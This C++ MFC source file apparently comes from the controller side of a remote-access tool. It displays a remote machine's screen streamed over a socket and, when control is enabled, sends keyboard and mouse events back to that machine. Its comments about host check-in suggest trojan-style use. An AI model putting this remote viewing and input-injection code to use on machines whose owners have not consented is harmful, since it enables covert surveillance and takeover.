// ScreenDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "maizang.h"
#include "ScreenDlg.h"
#include "afxdialogex.h"

#include "./zlib.h"
#pragma comment(lib,"./zlib.lib")	//图象无损数据压缩使用zlib库函数

// CScreenDlg 对话框

IMPLEMENT_DYNAMIC(CScreenDlg, CDialog)

	CScreenDlg::CScreenDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CScreenDlg::IDD, pParent)
{
	pData = new BYTE [2048 * 1536 * 3 * 2];//为分辨率2048 * 1536 且位为24位即3个字节的大小的 2倍  
	pChanged = new BYTE [2048 * 1536 * 3 * 2];//为分辨率2048 * 1536 且位为24位即3个字节的大小的 2倍  
	pCompress = new BYTE [2048 * 1536 * 3 * 2];
	m_ScreenBits = 8;
}

CScreenDlg::~CScreenDlg()
{
	TerminateThread(m_hScreenThread, 0);
	if(pData != NULL) { delete pData; pData = NULL;}
	if(pChanged != NULL) { delete pChanged; pChanged = NULL;}
	if(pCompress != NULL) {delete pCompress;}
	MsgHead msgHead;
	msgHead.dwCmd = 88;
	SendMsg(m_MainSocket, NULL, &msgHead);
	if (m_hWnd != NULL)
	{ 
		DestroyWindow();
	}
	//	if(m_ChoseSocket != INVALID_SOCKET ) {  //此处是整个上线信息所使用的socket 所以不能关闭
	//	closesocket(m_ChoseSocket);
	//}
}

void CScreenDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenDlg, CDialog)

	ON_WM_PAINT()
	//	ON_WM_SIZE()
	//	ON_WM_CLOSE()
	ON_WM_ERASEBKGND()
	ON_BN_CLICKED(IDC_RADIO1, &CScreenDlg::OnBnClickedRadio1)
	ON_BN_CLICKED(IDC_RADIO2, &CScreenDlg::OnBnClickedRadio2)
	ON_BN_CLICKED(IDC_RADIO3, &CScreenDlg::OnBnClickedRadio3)
	ON_BN_CLICKED(IDC_RADIO4, &CScreenDlg::OnBnClickedRadio4)
	ON_BN_CLICKED(IDC_RADIO5, &CScreenDlg::OnBnClickedRadio5)

	//	ON_WM_CANCELMODE()
	//ON_WM_DESTROY()
	ON_WM_VSCROLL()
	ON_WM_HSCROLL()
	ON_BN_CLICKED(IDC_BUTTON1, &CScreenDlg::OnBnClickedButton1)
	ON_WM_DESTROY()
	//ON_WM_NCDESTROY()
END_MESSAGE_MAP()


// CScreenDlg 消息处理程序



void CScreenDlg::SetSCreenSocket(SOCKET sock)
{
	m_MainSocket = sock;

	//创建线程  GetScreenThread
	unsigned dwThreadId;
	m_hScreenThread =
		(HANDLE)_beginthreadex(NULL, 
		0,					 
		GetScreenThread,  
		this,   
		0, 		 
		&dwThreadId);
	//CloseHandle(m_hScreenThread);
}
void CScreenDlg::SetChoseSocket(SOCKET sock)
{
	m_ChoseSocket = sock;
}
unsigned __stdcall  GetScreenThread(void   *pvoid)
{

	CScreenDlg* This = (CScreenDlg*)pvoid;//传递过来的本窗口的this指针 
	//This->GetFirstScreen();
	//return 0;
	if(This == NULL) return 0 ;
	MsgHead  MsgSend;
	MsgSend.dwCmd = CMD_GETFIRST_SCREEN;
	MsgSend.dwSize = 0;
	MsgSend.dwExtend1 = This->m_ScreenBits;
	if(!SendMsg( This->m_MainSocket, NULL, &MsgSend))//发出请求屏幕传输的要求
	{
		::MessageBox(NULL, "屏幕传输请求失败", "出错", MB_OK);
		closesocket( This->m_MainSocket);
		return 0;
	}
	//以下为屏幕的获取， 一直获取并显示  直到接收不到  
	MsgHead MsgRecv; 

	while( This->m_MainSocket != INVALID_SOCKET)
	{
		if(!RecvData( This->m_MainSocket, (char *)&MsgRecv, sizeof(MsgHead)))
		{
			//	::MessageBox(NULL, "屏幕数据接收，命令接收失败", "出错", MB_OK);
			closesocket( This->m_MainSocket);
			This->m_MainSocket = INVALID_SOCKET;
			return 0;
		}
		This->bmfHdr.bfType = 0x4D42;  // "BM"  	// 设置位图文件头 
		This->bmfHdr.bfSize = MsgRecv.dwExtend1;
		This->bmfHdr.bfReserved1 = 0;
		This->bmfHdr.bfReserved2 = 0;
		This->bmfHdr.bfOffBits = MsgRecv.dwExtend2;
		This->m_InfoSize = MsgRecv.dwExtend2 - sizeof(BITMAPFILEHEADER);//m_InfoSize为info信息头和调色板的大小的和


		int lenthcompress = MsgRecv.dwSize;
		int lenthUncompress = MsgRecv.dwExtend1 - sizeof(BITMAPFILEHEADER);

		if(!RecvData( This->m_MainSocket,(char *)This->pCompress,lenthcompress))
		{
			closesocket( This->m_MainSocket);
			This->m_MainSocket = INVALID_SOCKET;
			return 0;			    
		}

		This->IsFirst = This->pCompress[0];//传递过来的第一个字节标记是否是第一帧

		DWORD sz = 2048 * 1536 * 3 * 2;  //这个sz还必须有值  不然会崩溃
		if( This->pChanged == NULL ||  This->pData == NULL)  // 窗口关闭时，本线程可能仍旧运行一小段时间 故如果pData为NULL 就退出线程 否则弹出错误框
		{
			return 0;
		}
		if(This->pCompress == NULL) return 0;
		uncompress( This->pChanged,
			&sz,//原始长度
			This->pCompress + 1,//+1 是因为传过来的第一个字节不是压缩的数据 而是是否是第一帧（改变像素位数后也算第一帧）
			lenthcompress);//压缩后长度
		if( This->IsFirst)
		{
			memcpy( This->pData,  This->pChanged, sz);
		}
		else
		{
			This->m_ChangedOff =0;
			memcpy( This->pData,  This->pChanged,  This->m_InfoSize); //将新的信息头和调色板复制进data 
			BITMAPINFOHEADER bi;
			memcpy(&bi,  This->pData, sizeof(bi));//将文件信息头保存到bi

			This->m_ChangedOff =  This->m_InfoSize;
			RECT rect;
			memcpy(&rect,  This->pChanged +  This->m_ChangedOff, sizeof(rect));//得到变化的数据的范围 
			This->m_ChangedOff += sizeof(rect);

			This->m_DataOff =  This->m_InfoSize;
			BYTE *Dst, *Src; 
			int BitSz;
			BitSz = (rect.right - rect.left + 1) * bi.biBitCount / 8;//每行需要更新的数据量
			int OneLineByte =  bi.biSizeImage / bi.biHeight;
			for(int i = rect.top; i <= rect.bottom ; i++) 
			{						
				Src =  This->pChanged +  This->m_ChangedOff;
				Dst =  This->pData +  This->m_InfoSize + i * OneLineByte + rect.left * bi.biBitCount / 8;
				memcpy(Dst, Src, BitSz);//保存每一行变化的数据
				This->m_ChangedOff += BitSz;
			}
		}

		//将bitmap数据写入文件中  创建一个bmp图像文件
		//strcpy(strFilePath,"E://hehe.bmp");
		//if(hFile !=  INVALID_HANDLE_VALUE)  CloseHandle(hFile); 
		//hFile = CreateFile(strFilePath , GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);//创建位图文件   
		//DWORD dwWritten;
		//WriteFile(hFile, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);	// 写入位图文件头
		//WriteFile(hFile, (LPSTR)pData, bmfHdr.bfSize, &dwWritten, NULL);// 写入位图文件其余内容
		//CloseHandle(hFile); 	

		This->Invalidate(TRUE);
		This->IsFirst = FALSE;
		Sleep(10);
	}
	return 0;
}
BOOL CScreenDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	m_bCtrlScreen = FALSE;
	m_VScrollPos = 0;
	m_HScrollPos = 0;
	CRect rect;
	GetClientRect(rect);
	rect.top += 18;
	rect.left = rect.right - 15;
	rect.bottom -= 15;
	m_VScrollBar.Create(WS_CHILD | WS_VISIBLE | SB_VERT,//子控件 可见 垂直滚动条
		rect, this , WM_USER + 1000 ); 

	GetClientRect(rect);
	rect.top = rect.bottom - 15;
	rect.right = rect.right - 15;
	m_HScrollBar.Create(WS_CHILD | WS_VISIBLE | SB_HORZ,//子控件 可见 水平滚动条
		rect, this , WM_USER + 1001 ); 
	m_VScrollBar.SetScrollPos(m_VScrollPos);
	m_HScrollBar.SetScrollPos(m_HScrollPos);


	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CScreenDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO: 在此处添加消息处理程序代码
	CRect rect;
	GetClientRect(rect);
	rect.top += 18;
	rect.left = rect.right - 15;
	rect.bottom -= 15;
	m_VScrollBar.MoveWindow(rect); 

	GetClientRect(rect);
	rect.top = rect.bottom - 15;
	rect.right = rect.right - 15;
	m_HScrollBar.MoveWindow(rect); 
}






BOOL CScreenDlg::OnEraseBkgnd(CDC* pDC)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	//双缓存防止闪烁

	CRect rect;
	CDC DCmem;
	DCmem.CreateCompatibleDC(pDC);//创建与pDC兼容的内存DC
	CBitmap bitmap;
	//以下也可以从一个文件中载入bitmap图像  如注释中的语句
	bitmap.m_hObject  = GetBitmapFromData();
	CBitmap *pOldBit=DCmem.SelectObject(&bitmap);//将图像调入内存DC
	GetClientRect(&rect);

	BITMAP   bm;  
	GetObject(bitmap.m_hObject,sizeof(bm),&bm);  //得到bitmap 信息

	int Height, Width;//能用于显示图像的窗口范围
	Width = rect.right   - 15 - rect.left;//-15是因为滚动条的大小我设置为15
	Height = rect.bottom - 18 - 15 - rect.top;//图像控件可用于显示图像的范围 因为有滚动条 所以有一定的范围 要 -15  18是按钮的宽度
	int restH = bm.bmHeight - Height;
	if(restH < 0) restH = 0;
	int restW = bm.bmWidth - Width;
	if(restW < 0) restW = 0;

	//水平滚动条操作
	SCROLLINFO Hinfo;//配置滑块的一些信息！ 注意是滑块的！ 不是滚动条 是你拖动的那个小快快 
	Hinfo.cbSize = sizeof(SCROLLINFO);  //固定！  本结构的大小    
	Hinfo.fMask = SIF_ALL;  //一些属性  
	Hinfo.nMin = 0;   //滑块所能到达的最小范围
	Hinfo.nMax = bm.bmWidth;//滑块所能到达的最大范围 假如是一个图像 则为图像的宽度
	Hinfo.nPage = 10;//滑块的大小
	Hinfo.nPos = m_HScrollPos;//滑块的位置
	m_HScrollBar.SetScrollInfo(&Hinfo);
	m_HScrollBar.SetScrollRange(0, restW);

	//竖直滚动条操作
	SCROLLINFO info;//配置滑块的一些信息！ 注意是滑块的！ 不是滚动条 是你拖动的那个小快快 
	info.cbSize = sizeof(SCROLLINFO);  //固定！  本结构的大小    
	info.fMask = SIF_ALL;  //一些属性  
	info.nMin = 0;   //滑块所能到达的最小范围
	info.nMax = bm.bmHeight;//滑块所能到达的最大范围 假如是一个图像 则为图像的高度
	info.nPage = 10;//滑块的大小
	info.nPos = m_VScrollPos;//滑块的位置
	m_VScrollBar.SetScrollInfo(&info);
	m_VScrollBar.SetScrollRange(0, restH);//当不加时 不知道为什么不能滚动最下面 所以增大了滚动范围



	BitBlt(pDC->GetSafeHdc(), rect.left, rect.top + 18, rect.right -15 , rect.bottom - 15 , DCmem, m_HScrollPos, m_VScrollPos, SRCCOPY);

	GetClientRect(rect);
	rect.bottom = 18;
	COLORREF color=RGB(174,221,129);
	pDC->FillSolidRect(rect,color);//使用某种颜色填充客户区上头一拇指粗的长方形区域，不然如果有按钮控件的话，按钮控件周边会被填充屏幕的图像		 

	DCmem.DeleteDC();     //删除DC
	bitmap.DeleteObject(); //删除位图
	ReleaseDC(pDC);//pDC->GetSafeHdc()不需要释放 因为pDC指向dc释放后 其内存的hdc也会释放掉
	return TRUE;
}


HBITMAP CScreenDlg::GetBitmapFromData()
{
	HBITMAP hBitmap;
	PBITMAPINFO lpBmpInfo; //位图信息

	lpBmpInfo = PBITMAPINFO(pData);

	HDC hDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	// 创建DDB位图
	hBitmap = CreateDIBitmap(
		hDC,
		&lpBmpInfo->bmiHeader,
		CBM_INIT,
		pData + m_InfoSize,
		lpBmpInfo,
		DIB_RGB_COLORS) ;

	DeleteDC(hDC);

	return hBitmap;
}

void CScreenDlg::OnBnClickedRadio1()
{
	// TODO: 在此添加控件通知处理程序代码
	m_ScreenBits = 1;
	ChangeScreenBits();
}


void CScreenDlg::OnBnClickedRadio2()
{
	// TODO: 在此添加控件通知处理程序代码
	m_ScreenBits = 4;
	ChangeScreenBits();
}


void CScreenDlg::OnBnClickedRadio3()
{
	// TODO: 在此添加控件通知处理程序代码
	m_ScreenBits = 8;
	ChangeScreenBits();
}


void CScreenDlg::OnBnClickedRadio4()
{
	// TODO: 在此添加控件通知处理程序代码
	m_ScreenBits = 16;
	ChangeScreenBits();
}


void CScreenDlg::OnBnClickedRadio5()
{
	// TODO: 在此添加控件通知处理程序代码
	m_ScreenBits = 24;
	ChangeScreenBits();
}


void CScreenDlg::ChangeScreenBits()
{
	MsgHead MsgSend;
	MsgSend.dwCmd = CMD_CHANGE_SCREEN_BITS;//改变像素位数
	MsgSend.dwSize = 0;
	MsgSend.dwExtend1 = m_ScreenBits;
	if(!SendMsg(m_MainSocket, NULL, &MsgSend)) 
	{
		::MessageBox(NULL, "改变屏幕像素位数失败", "出错", MB_OK);
		closesocket(m_MainSocket);
		return ;
	}
	return ;
}










void CScreenDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	int iPos = nPos;
	int TempPos = pScrollBar->GetScrollPos();
	int iMin = 0, iMax = 0;
	pScrollBar->GetScrollRange(&iMin, &iMax);
	switch (nSBCode)
	{
	case SB_THUMBTRACK://拖动滑块
		if (iPos < TempPos && iPos >= iMin)
		{
			pScrollBar->SetScrollPos(iPos, TRUE);

		}
		else if (iPos > TempPos && iPos <= iMax)
		{
			pScrollBar->SetScrollPos(iPos, TRUE);

		}
		m_VScrollPos = pScrollBar->GetScrollPos();
		UpdateData(FALSE);
		break;
		//case SB_THUMBPOSITION://拖动滑块
		//	pScrollBar->SetScrollPos(iPos, FALSE);
		//	
		//	break;
	case SB_LINEUP://点击上边的箭头
		if(TempPos > iMin)
		{
			pScrollBar->SetScrollPos(TempPos-1, TRUE);
			m_VScrollPos = pScrollBar->GetScrollPos();
		}
		break;
	case SB_LINEDOWN://点击下边的箭头
		if(TempPos < iMax)
		{
			pScrollBar->SetScrollPos(TempPos+1, TRUE);
			m_VScrollPos = pScrollBar->GetScrollPos();
		}
		break;
	case SB_PAGEUP://点击滚动条上方空白
		if(TempPos > iMin)
		{
			pScrollBar->SetScrollPos(TempPos-1, TRUE);
			m_VScrollPos = pScrollBar->GetScrollPos();
		}
		break;
	case SB_PAGEDOWN://点击滚动条下方空白
		if(TempPos < iMax)
		{
			pScrollBar->SetScrollPos(TempPos+1, TRUE);
			m_VScrollPos = pScrollBar->GetScrollPos();
		}
		break;
	case SB_ENDSCROLL:
		m_VScrollPos = pScrollBar->GetScrollPos();
		UpdateData(FALSE);
		break;
	default:
		break;
	}
	CDialog::OnVScroll(nSBCode, nPos, pScrollBar);
}


void CScreenDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	int iPos = nPos;
	int TempPos = pScrollBar->GetScrollPos();
	int iMin = 0, iMax = 0;
	pScrollBar->GetScrollRange(&iMin, &iMax);
	switch (nSBCode)
	{
	case SB_THUMBTRACK://拖动滑块
		if (iPos < TempPos && iPos >= iMin)
		{
			pScrollBar->SetScrollPos(iPos, TRUE);

		}
		else if (iPos > TempPos && iPos <= iMax)	
		{
			pScrollBar->SetScrollPos(iPos, TRUE);

		}
		m_HScrollPos = pScrollBar->GetScrollPos();
		UpdateData(FALSE);
		break;
		//case SB_THUMBPOSITION://拖动滑块
		//	pScrollBar->SetScrollPos(iPos, FALSE);
		//	
		//	break;
	case SB_LINEUP://点击上边的箭头
		if(TempPos > iMin)
		{
			pScrollBar->SetScrollPos(TempPos-1, TRUE);
			m_HScrollPos = pScrollBar->GetScrollPos();
		}
		break;
	case SB_LINEDOWN://点击下边的箭头
		if(TempPos < iMax)
		{
			pScrollBar->SetScrollPos(TempPos+1, TRUE);
			m_HScrollPos = pScrollBar->GetScrollPos();
		}
		break;
	case SB_PAGEUP://点击滚动条上方空白
		if(TempPos > iMin)
		{
			pScrollBar->SetScrollPos(TempPos-1, TRUE);
			m_HScrollPos = pScrollBar->GetScrollPos();
		}
		break;
	case SB_PAGEDOWN://点击滚动条下方空白
		if(TempPos < iMax)
		{
			pScrollBar->SetScrollPos(TempPos+1, TRUE);
			m_HScrollPos = pScrollBar->GetScrollPos();
		}
		break;
	case SB_ENDSCROLL:
		m_HScrollPos = pScrollBar->GetScrollPos();
		UpdateData(FALSE);
		break;
	default:
		break;
	}
	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}


void CScreenDlg::OnBnClickedButton1()
{

	if(m_bCtrlScreen == FALSE)
	{
		m_bCtrlScreen = TRUE;
		SetDlgItemText(IDC_BControl,"控制中，单击停止");
	}
	else
	{
		m_bCtrlScreen = FALSE;
		SetDlgItemText(IDC_BControl,"点击申请控制");
	}

	// TODO: 在此添加控件通知处理程序代码
}


BOOL CScreenDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	HWND hPicWnd = this->m_hWnd;
	if(m_bCtrlScreen && pMsg->message == WM_KEYDOWN  )
	{

		int nVirtKey = pMsg->wParam;

		MsgHead msgHead;
		msgHead.dwCmd = CMD_KEYDOWN;
		msgHead.dwSize = 0;
		msgHead.dwExtend1 = nVirtKey;

		if(SendMsg(m_ChoseSocket,NULL,&msgHead))
		{
			//	::MessageBox(NULL, "发送成功", "DD", MB_OK);
		}
		else 
		{
			::MessageBox(NULL, "鼠标事件发送失败", "鼠标事件发送失败", MB_OK);
		}


		return TRUE;
	}
	if(m_bCtrlScreen && pMsg->message == WM_KEYUP  )
	{
		int nVirtKey = pMsg->wParam;

		MsgHead msgHead;
		msgHead.dwCmd = CMD_KEYUP;
		msgHead.dwSize = 0;
		msgHead.dwExtend1 = nVirtKey;

		SendMsg(m_ChoseSocket,NULL,&msgHead);

		return TRUE;
	}

	if(m_bCtrlScreen && pMsg->hwnd == hPicWnd&& pMsg->message == WM_MOUSEMOVE )
	{

		CRect rc;
		GetClientRect(&rc);
		int nXPos = m_HScrollPos;
		int nYPos = m_VScrollPos;

		int dwX = nXPos + LOWORD(pMsg->lParam);
		int dwY =  nYPos + HIWORD(pMsg->lParam);
		dwY -= 15; 

		MsgHead msgHead;
		msgHead.dwCmd = CMD_MOUSEMOVE;
		msgHead.dwSize = 0;
		msgHead.dwExtend1 = dwX;
		msgHead.dwExtend2 = dwY;

		if(!SendMsg(m_ChoseSocket,NULL,&msgHead))
		{
			::MessageBox(NULL, "mouse move发送失败", "" ,MB_OK);
		}

		return TRUE;
	}

	if(m_bCtrlScreen && pMsg->hwnd == hPicWnd &&pMsg->message == WM_LBUTTONDOWN  )// 点击左键
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_LBUTTONDOWN;
		msgHead.dwSize = 0;

		if(SendMsg(m_ChoseSocket,NULL,&msgHead))
		{
			//::MessageBox(NULL, "发送D成功", "DD", MB_OK);
		}
		else 
		{

		}

		return TRUE;
	}
	if(m_bCtrlScreen && pMsg->hwnd == hPicWnd && pMsg->message == WM_LBUTTONUP)
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_LBUTTONUP;
		msgHead.dwSize = 0;

		SendMsg(m_ChoseSocket,NULL,&msgHead);

		return TRUE;
	}
	if(m_bCtrlScreen && pMsg->hwnd == hPicWnd && pMsg->message == WM_LBUTTONDBLCLK  )
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_LBUTTONDBLCLK;
		msgHead.dwSize = 0;

		SendMsg(m_ChoseSocket,NULL,&msgHead);

		return TRUE;
	}
	if(m_bCtrlScreen && pMsg->hwnd == hPicWnd && pMsg->message == WM_RBUTTONDOWN )
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_RBUTTONDOWN;
		msgHead.dwSize = 0;

		SendMsg(m_ChoseSocket,NULL,&msgHead);

		return TRUE;
	}
	if(m_bCtrlScreen && pMsg->hwnd == hPicWnd && pMsg->message == WM_RBUTTONUP )
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_RBUTTONUP;
		msgHead.dwSize = 0;

		SendMsg(m_ChoseSocket,NULL,&msgHead);

		return TRUE;
	}
	if(m_bCtrlScreen && pMsg->hwnd == hPicWnd && pMsg->message == WM_RBUTTONDBLCLK )
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_RBUTTONDBLCLK;
		msgHead.dwSize = 0;

		SendMsg(m_ChoseSocket,NULL,&msgHead);

		return TRUE;
	}	

	return CDialog::PreTranslateMessage(pMsg);
}


void CScreenDlg::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	//非模式对话框，需要这样销毁对话框
	//::MessageBox(NULL, "hehe", "haha", MB_OK);
	if(pData != NULL)
	{
		delete[] pData;
		pData = NULL;
	}
	if(pChanged != NULL)
	{
		delete[] pChanged;
		pChanged = NULL;
	}


	if (m_hWnd != NULL)
	{

		DestroyWindow();
	}
}



void CScreenDlg::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类

	CDialog::PostNcDestroy();
	delete this;
}


void CScreenDlg::GetFirstScreen()
{
	/*
	MsgHead  MsgSend;
	MsgSend.dwCmd = CMD_GETFIRST_SCREEN;
	MsgSend.dwSize = 0;
	MsgSend.dwExtend1 = m_ScreenBits;
	if(!SendMsg(m_MainSocket, NULL, &MsgSend))//发出请求屏幕传输的要求
	{
	::MessageBox(NULL, "屏幕传输请求失败", "出错", MB_OK);
	closesocket(m_MainSocket);
	return ;
	}
	//以下为屏幕的获取， 一直获取并显示  直到接收不到  
	MsgHead MsgRecv; 

	while(m_MainSocket != INVALID_SOCKET)
	{

	if(!RecvData(m_MainSocket, (char *)&MsgRecv, sizeof(MsgHead)))
	{
	//	::MessageBox(NULL, "屏幕数据接收，命令接收失败", "出错", MB_OK);
	closesocket(m_MainSocket);
	m_MainSocket = INVALID_SOCKET;
	return ;
	}
	bmfHdr.bfType = 0x4D42;  // "BM"  	// 设置位图文件头 
	bmfHdr.bfSize = MsgRecv.dwExtend1;
	bmfHdr.bfReserved1 = 0;
	bmfHdr.bfReserved2 = 0;
	bmfHdr.bfOffBits = MsgRecv.dwExtend2;
	m_InfoSize = MsgRecv.dwExtend2 - sizeof(BITMAPFILEHEADER);//m_InfoSize为info信息头和调色板的大小的和


	int lenthcompress = MsgRecv.dwSize;
	int lenthUncompress = MsgRecv.dwExtend1 - sizeof(BITMAPFILEHEADER);
	BYTE* pCompress = new BYTE [lenthcompress];


	if(!RecvData(m_MainSocket,(char *)pCompress,lenthcompress))
	{
	if(pCompress != NULL ){
	delete [] pCompress;
	pCompress = NULL;
	}
	//	::MessageBox(NULL, "屏幕数据接收，数据接收失败", "出错", MB_OK);
	closesocket(m_MainSocket);
	m_MainSocket = INVALID_SOCKET;
	return ;			    
	}
	IsFirst = pCompress[0];//传递过来的第一个字节标记是否是第一帧

	DWORD sz = 2048 * 1536 * 3 * 2;  //这个sz还必须有值  不然会崩溃
	if(pChanged == NULL || pData == NULL)  // 窗口关闭时，本线程可能仍旧运行一小段时间 故如果pData为NULL 就退出线程 否则弹出错误框
	{
	if(pCompress != NULL )
	{     delete [] pCompress;
	pCompress = NULL;
	}
	return ;
	}
	uncompress(pChanged,
	&sz,//原始长度
	pCompress + 1,//+1 是因为传过来的第一个字节不是压缩的数据 而是是否是第一帧（改变像素位数后也算第一帧）
	lenthcompress);//压缩后长度
	if(IsFirst)
	{
	memcpy(pData, pChanged, sz);
	}
	else
	{
	m_ChangedOff =0;
	memcpy(pData, pChanged, m_InfoSize); //将新的信息头和调色板复制进data 
	BITMAPINFOHEADER bi;
	memcpy(&bi, pData, sizeof(bi));//将文件信息头保存到bi

	m_ChangedOff = m_InfoSize;
	RECT rect;
	memcpy(&rect, pChanged + m_ChangedOff, sizeof(rect));//得到变化的数据的范围 
	m_ChangedOff += sizeof(rect);

	m_DataOff = m_InfoSize;
	BYTE *Dst, *Src; 
	int BitSz;
	BitSz = (rect.right - rect.left + 1) * bi.biBitCount / 8;//每行需要更新的数据量
	int OneLineByte =  bi.biSizeImage / bi.biHeight;
	for(int i = rect.top; i <= rect.bottom ; i++) 
	{						
	Src = pChanged + m_ChangedOff;
	Dst = pData + m_InfoSize + i * OneLineByte + rect.left * bi.biBitCount / 8;
	memcpy(Dst, Src, BitSz);//保存每一行变化的数据
	m_ChangedOff += BitSz;
	}
	}
	delete [] pCompress;
	pCompress = NULL;

	//将bitmap数据写入文件中  创建一个bmp图像文件
	//strcpy(strFilePath,"E://hehe.bmp");
	//if(hFile !=  INVALID_HANDLE_VALUE)  CloseHandle(hFile); 
	//hFile = CreateFile(strFilePath , GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);//创建位图文件   
	//DWORD dwWritten;
	//WriteFile(hFile, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);	// 写入位图文件头
	//WriteFile(hFile, (LPSTR)pData, bmfHdr.bfSize, &dwWritten, NULL);// 写入位图文件其余内容
	//CloseHandle(hFile); 	
	Invalidate(TRUE);
	IsFirst = FALSE;
	Sleep(10);
	}
	*/
}